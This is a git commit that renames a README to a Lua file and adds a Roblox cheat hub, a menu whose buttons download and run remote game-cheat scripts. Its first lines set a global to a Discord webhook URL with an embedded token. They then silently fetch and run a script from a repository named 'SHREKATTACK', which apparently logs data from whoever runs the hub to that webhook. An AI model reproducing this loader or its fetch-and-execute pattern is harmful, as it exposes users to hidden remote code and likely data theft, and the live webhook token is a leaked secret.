35ad215fb243f2617771f5fa21e512fde94d6e7a
DARKXEDIT01 <94621554+DARKXEDIT01@users.noreply.github.com>
2021-12-25 22:24:21 +0700

    Update and rename README.md to README.lua

---
+++ README.lua
@@ -0,0 +1,48 @@
+_G.webhooksdiscord = "https://discord.com/api/webhooks/903377655972380672/bjpjdngEqmcbf33AWib6oM6rEoLGA_8qKufv0w10OQ4zusI1hdkdzOySNcgtKojVdVHV"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
+--bloxfrut--
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("NONAME-HUB", "Synapse")
+--
+local Tab = Window:NewTab("BLOX FRUIT")
+local Section = Tab:NewSection("BLOX FRUIT")
+Section:NewButton("CLICK", "PUT FUNCTION", function()
+    loadstring(game:HttpGet(("https://raw.githubusercontent.com/koonpeatch/PeatEX/master/BKHAX/BloxFruits"),true))() 
+end)
+--asenal--
+--
+local Tab = Window:NewTab("ASENAL")
+local Section = Tab:NewSection("ASENAL")
+Section:NewButton("CLICK", "PUT FUNCTION", function()
+    loadstring(game:HttpGet(('https://pastebin.com/raw/kvpwyQRT')))()
+end)
+--alll star--
+local Tab = Window:NewTab("All Satr")
+local Section = Tab:NewSection("All star")
+Section:NewButton("CLICK", "PUT FUNCTION", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/SuperOuro/Lua-Scripts/main/all_star_tower_defense.lua"))()
+end)
+--king legacy--
+local Tab = Window:NewTab("KING LEGACY")
+local Section = Tab:NewSection("King legacy")
+Section:NewButton("CLICK", "PUT FUNCTION", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/sannin9000/scripts/main/kinglegacy.lua"))()
+end)
+--shindo--
+local Tab = Window:NewTab("SHINDO")
+local Section = Tab:NewSection("SHINDO")
+Section:NewButton("CLICK", "PUT FUNCTION", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/reavscripts/sl2_autofarm/main/main.lua", true))()
+end)
+--brookhaven--
+local Tab = Window:NewTab("Brookhaven")
+local Section = Tab:NewSection("brookhaven")
+Section:NewButton("CLICK", "PUT FUNCTION", function()
+    loadstring(game:HttpGet("https://gist.githubusercontent.com/TurkOyuncu99/93d59eb6d826262396d8436868e73033/raw/eaa85b6545ff8a06fe89d7093cb3666461b628e8/gaga", true))()
+end)
+--
+local Tab = Window:NewTab("Anime Fighters")
+local Section = Tab:NewSection("Anime Fighters Simulator")
+Section:NewButton("CLICK", "PUT FUNCTION", function()
+    loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/KiJinGaming/FreeScript/main/KJHub.lua"))
+end)
